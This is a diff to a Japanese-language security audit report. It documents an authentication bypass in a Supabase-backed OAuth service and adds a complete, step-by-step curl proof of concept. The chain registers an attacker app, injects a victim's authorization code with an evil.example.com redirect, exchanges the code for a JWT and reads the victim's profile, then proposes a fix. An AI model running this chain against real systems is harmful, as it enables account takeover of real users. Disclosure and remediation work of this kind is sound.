@@ -64,9 +64,9 @@ if (!JWT_SECRET) throw new Error('JWT_SECRET environment variable is required');
 
 ---
 
-### VULN-NEW: Supabase RPC関数の認証バイパス (未認証での全OAuth操作)
+### VULN-NEW: Supabase RPC関数の認証バイパス → 完全なアカウント乗っ取り
 - **深刻度**: **Critical** (CVSS 9.8相当)
-- **PoC結果**: **実証成功** — 5つのRPC関数で未認証操作を確認
+- **PoC結果**: **完全な攻撃チェーン実証成功** — anon keyのみで任意ユーザーのJWTを取得し、なりすましに成功
 
 **問題**: `member`スキーマのRPC関数がSupabase anon keyのみで呼び出し可能。RLS (Row-Level Security) がRPC関数に適用されておらず、以下の操作が完全に未認証で実行可能:
 
@@ -165,13 +165,78 @@ $ curl -s ".../rpc/delete_application" ... -d '{"p_id": "b1127fae-..."}'
 # → true
 ```
 
-**完全な攻撃チェーン**:
+**完全な攻撃チェーン (実証済み)**:
 1. `list_applications` で正規OAuthクライアント情報を取得
 2. `get_application_by_client_id` でclient_secret_hashを入手
-3. `create_authorization_code` で被害者ユーザーIDの認可コードを注入
-4. `create_user_consent` でconsent記録を偽造 (再認可プロンプトを回避)
-5. トークンエンドポイントで認可コードをJWTに交換
-6. 被害者として勤怠管理システムにアクセス
+3. `create_application` で攻撃者のOAuthアプリを登録 (正しいbcryptハッシュ付き)
+4. `create_authorization_code` で被害者ユーザーIDの認可コードを注入 (攻撃者が知るcode_challenge付き)
+5. `POST /oauth/token` で認可コードをJWTに交換 (攻撃者がclient_secret + code_verifierを両方知っている)
+6. `GET /oauth/userinfo` で被害者のプロフィール情報を窃取
+
+#### PoC F: 完全な攻撃チェーン実行 — **実証成功 (アカウント乗っ取り)**
+```bash
+# STEP 1: 攻撃者のclient_secretのbcryptハッシュを生成
+$ node -e "require('bcryptjs').hash('attacker-known-secret-poc',10).then(h=>console.log(h))"
+# → $2b$10$8N37dYKv5q5rEtvZe8SIMOS4natwrStAYORVzUsE0qJJlqjFG/Ub.
+
+# STEP 2: 攻撃者アプリ登録 (正しいbcryptハッシュ)
+$ curl -s ".../rpc/create_application" ... -d '{
+    "p_name":"PoC-Full-Chain-App",
+    "p_client_id":"evil-final-client-id-000000000000000000000000000000000",
+    "p_client_secret_hash":"$2b$10$8N37dYKv5q5rEtvZe8SIMOS4natwrStAYORVzUsE0qJJlqjFG/Ub.",
+    "p_redirect_uris":["https://evil.example.com/callback"],
+    "p_created_by":"fdb0654f-e7d0-45bf-9af8-0957223c38d3"}'
+# → アプリID: 72cf6921-a536-4704-bf1d-3897b5af7f87 ✅
+
+# STEP 3: PKCE code_challenge生成 (攻撃者が知るverifier)
+$ CODE_VERIFIER="super-secret-verifier-that-only-attacker-knows-1234567890"
+$ CODE_CHALLENGE=$(echo -n "$CODE_VERIFIER" | openssl dgst -sha256 -binary | openssl base64 -A | tr '+/' '-_' | tr -d '=')
+
+# STEP 4: 被害者の認可コード注入
+$ curl -s ".../rpc/create_authorization_code" ... -d '{
+    "p_application_id":"72cf6921-...",
+    "p_user_id":"fdb0654f-e7d0-45bf-9af8-0957223c38d3",
+    "p_code":"evil-code-final-1775381017",
+    "p_redirect_uri":"https://evil.example.com/callback",
+    "p_scope":"openid profile",
+    "p_code_challenge":"x0NOsA7vYWENgnoF24GuW6dUze_MDbbf78GDpmYmHPk",
+    "p_code_challenge_method":"S256",
+    "p_expires_at":"2026-12-31T23:59:59Z"}'
+# → true ✅
+
+# STEP 5: トークン交換 (攻撃者はclient_secret + code_verifierを両方知っている)
+$ curl -s -X POST "https://member.stemask.com/oauth/token" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "grant_type=authorization_code\
+&code=evil-code-final-1775381017\
+&redirect_uri=https://evil.example.com/callback\
+&client_id=evil-final-client-id-000000000000000000000000000000000\
+&client_secret=attacker-known-secret-poc\
+&code_verifier=super-secret-verifier-that-only-attacker-knows-1234567890"
+# → {
+#   "access_token": "eyJhbGciOiJIUzI1NiIs...",
+#   "token_type": "Bearer",
+#   "expires_in": 3600,
+#   "scope": "openid profile"
+# }
+# ✅ JWT取得成功!
+
+# STEP 6: 被害者になりすまし
+$ curl -s "https://member.stemask.com/oauth/userinfo" \
+    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
+# → {
+#   "sub": "fdb0654f-e7d0-45bf-9af8-0957223c38d3",
+#   "generation": 9,
+#   "status": 1
+# }
+# ✅✅✅ 被害者のプロフィール取得成功 — 完全なアカウント乗っ取り!
+```
+
+**攻撃の影響**:
+- 攻撃者はログイン不要 (Supabase anon keyはクライアントJSから抽出可能)
+- 任意ユーザーのsub (UUID) さえ分かれば、そのユーザーとしてJWTを取得可能
+- 取得したJWTは勤怠管理システム等の連携アプリで被害者としてアクセス可能
+- 正規OAuthアプリの削除 (DoS) も可能
 
 **修正案**: 全RPC関数にRLSポリシーまたはセキュリティdefiner + auth.uid()チェックを追加:
 ```sql
